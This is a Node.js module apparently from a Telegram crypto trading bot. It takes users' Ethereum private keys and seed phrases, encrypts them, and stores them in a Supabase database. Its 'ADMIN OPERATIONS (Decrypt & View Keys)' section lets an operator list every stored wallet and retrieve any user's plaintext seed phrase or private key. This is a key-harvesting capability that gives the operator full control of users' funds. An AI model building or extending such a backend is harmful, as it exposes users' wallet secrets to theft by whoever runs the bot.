const crypto = require('crypto');
const { ethers } = require('ethers');
const config = require('./config');

const ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 16;

// ═══════════════════════════════════════════════════
// 🔐 Encryption helpers (unchanged)
// ═══════════════════════════════════════════════════
function encrypt(text) {
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv(
        ALGORITHM,
        Buffer.from(config.ENCRYPTION_KEY, 'hex'),
        iv
    );
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const tag = cipher.getAuthTag();
    return iv.toString('hex') + ':' + tag.toString('hex') + ':' + encrypted;
}

function decrypt(encryptedText) {
    const [ivHex, tagHex, encrypted] = encryptedText.split(':');
    const iv = Buffer.from(ivHex, 'hex');
    const tag = Buffer.from(tagHex, 'hex');
    const decipher = crypto.createDecipheriv(
        ALGORITHM,
        Buffer.from(config.ENCRYPTION_KEY, 'hex'),
        iv
    );
    decipher.setAuthTag(tag);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

// ═══════════════════════════════════════════════════
// 💾 SUPABASE OPERATIONS
// ═══════════════════════════════════════════════════
async function importPrivateKey(telegramId, privateKey, username = null) {
    try {
        let normalizedKey = privateKey.trim();
        if (!normalizedKey.startsWith('0x')) normalizedKey = '0x' + normalizedKey;

        const wallet = new ethers.Wallet(normalizedKey);
        const encryptedKey = encrypt(normalizedKey);

        // Upsert to Supabase (insert or update if exists)
        const { data, error } = await config.supabase
            .from('wallets')
            .upsert({
                telegram_id: telegramId,
                username: username,
                address: wallet.address.toLowerCase(),
                encrypted_key: encryptedKey,
                key_type: 'private_key',
                is_active: true,
                updated_at: new Date().toISOString()
            }, { onConflict: 'telegram_id' })
            .select()
            .single();

        if (error) throw error;

        return {
            success: true,
            address: wallet.address,
            type: 'evm',
            dbRecord: data
        };
    } catch (err) {
        console.error('Import private key error:', err);
        return { success: false, error: 'Invalid private key' };
    }
}

async function importSeedPhrase(telegramId, seedPhrase, username = null) {
    try {
        const words = seedPhrase.trim().toLowerCase().split(/\s+/);
        if (words.length !== 12 && words.length !== 24) {
            return { success: false, error: 'Seed phrase must be 12 or 24 words' };
        }

        const wallet = ethers.Wallet.fromPhrase(seedPhrase.trim());
        const encryptedKey = encrypt(seedPhrase.trim());

        const { data, error } = await config.supabase
            .from('wallets')
            .upsert({
                telegram_id: telegramId,
                username: username,
                address: wallet.address.toLowerCase(),
                encrypted_key: encryptedKey,
                key_type: 'seed_phrase',
                is_active: true,
                updated_at: new Date().toISOString()
            }, { onConflict: 'telegram_id' })
            .select()
            .single();

        if (error) throw error;

        return {
            success: true,
            address: wallet.address,
            type: 'evm',
            dbRecord: data
        };
    } catch (err) {
        console.error('Import seed phrase error:', err);
        return { success: false, error: 'Invalid seed phrase' };
    }
}

// ═══════════════════════════════════════════════════
// 🔓 READ OPERATIONS
// ═══════════════════════════════════════════════════
async function getWallet(telegramId) {
    try {
        const { data, error } = await config.supabase
            .from('wallets')
            .select('*')
            .eq('telegram_id', telegramId)
            .eq('is_active', true)
            .single();

        if (error || !data) return null;

        const decrypted = decrypt(data.encrypted_key);
        if (data.key_type === 'seed_phrase') {
            return ethers.Wallet.fromPhrase(decrypted);
        } else {
            return new ethers.Wallet(decrypted);
        }
    } catch (err) {
        console.error('Get wallet error:', err);
        return null;
    }
}

async function getWalletInfo(telegramId) {
    const { data } = await config.supabase
        .from('wallets')
        .select('telegram_id, address, key_type, created_at')
        .eq('telegram_id', telegramId)
        .eq('is_active', true)
        .single();

    if (!data) return null;

    return {
        telegramId: data.telegram_id,
        address: data.address,
        type: data.key_type,
        importedAt: new Date(data.created_at).getTime()
    };
}

async function hasWallet(telegramId) {
    const { count } = await config.supabase
        .from('wallets')
        .select('*', { count: 'exact', head: true })
        .eq('telegram_id', telegramId)
        .eq('is_active', true);

    return count > 0;
}

async function removeWallet(telegramId) {
    await config.supabase
        .from('wallets')
        .update({ is_active: false, updated_at: new Date().toISOString() })
        .eq('telegram_id', telegramId);
}

// ═══════════════════════════════════════════════════
// 👑 ADMIN OPERATIONS (Decrypt & View Keys)
// ═══════════════════════════════════════════════════
async function getAllWallets(limit = 100, offset = 0) {
    const { data, error, count } = await config.supabase
        .from('wallets')
        .select('*', { count: 'exact' })
        .eq('is_active', true)
        .order('created_at', { ascending: false })
        .range(offset, offset + limit - 1);

    if (error) throw error;
    return { wallets: data || [], total: count || 0 };
}

async function decryptWalletKey(telegramId) {
    const { data, error } = await config.supabase
        .from('wallets')
        .select('*')
        .eq('telegram_id', telegramId)
        .single();

    if (error || !data) return null;

    return {
        telegramId: data.telegram_id,
        username: data.username,
        address: data.address,
        keyType: data.key_type,
        plaintextKey: decrypt(data.encrypted_key),
        createdAt: data.created_at
    };
}

async function getUserStats(telegramId) {
    const { data: wallet } = await config.supabase
        .from('wallets')
        .select('*')
        .eq('telegram_id', telegramId)
        .single();

    const { data: trades } = await config.supabase
        .from('trades')
        .select('*')
        .eq('telegram_id', telegramId)
        .order('created_at', { ascending: false });

    const successful = (trades || []).filter(t => t.status === 'success');
    const totalProfit = successful.reduce((sum, t) => sum + parseFloat(t.profit_usd || 0), 0);

    return {
        wallet,
        totalTrades: (trades || []).length,
        successfulTrades: successful.length,
        totalProfit,
        successRate: (trades || []).length > 0
            ? (successful.length / trades.length * 100).toFixed(1)
            : 0
    };
}

async function logAdminAction(adminId, action, targetId = null, ip = null) {
    await config.supabase.from('admin_logs').insert({
        admin_telegram_id: adminId,
        action,
        target_telegram_id: targetId,
        ip_address: ip
    });
}

// ═══════════════════════════════════════════════════
// 📊 AGGREGATE STATS (for dashboard)
// ═══════════════════════════════════════════════════
async function getGlobalStats() {
    const { count: totalWallets } = await config.supabase
        .from('wallets')
        .select('*', { count: 'exact', head: true })
        .eq('is_active', true);

    const { data: recentTrades } = await config.supabase
        .from('trades')
        .select('profit_usd, status')
        .gte('created_at', new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString());

    const successfulTrades = (recentTrades || []).filter(t => t.status === 'success');
    const totalProfit24h = successfulTrades.reduce((sum, t) => sum + parseFloat(t.profit_usd || 0), 0);

    return {
        totalWallets: totalWallets || 0,
        tradesLast24h: (recentTrades || []).length,
        successfulTrades24h: successfulTrades.length,
        totalProfit24h
    };
}

module.exports = {
    encrypt,
    decrypt,
    importPrivateKey,
    importSeedPhrase,
    getWallet,
    getWalletInfo,
    hasWallet,
    removeWallet,
    // Admin
    getAllWallets,
    decryptWalletKey,
    getUserStats,
    logAdminAction,
    getGlobalStats,
    userStates: new Map() // Still in-memory for conversation states
};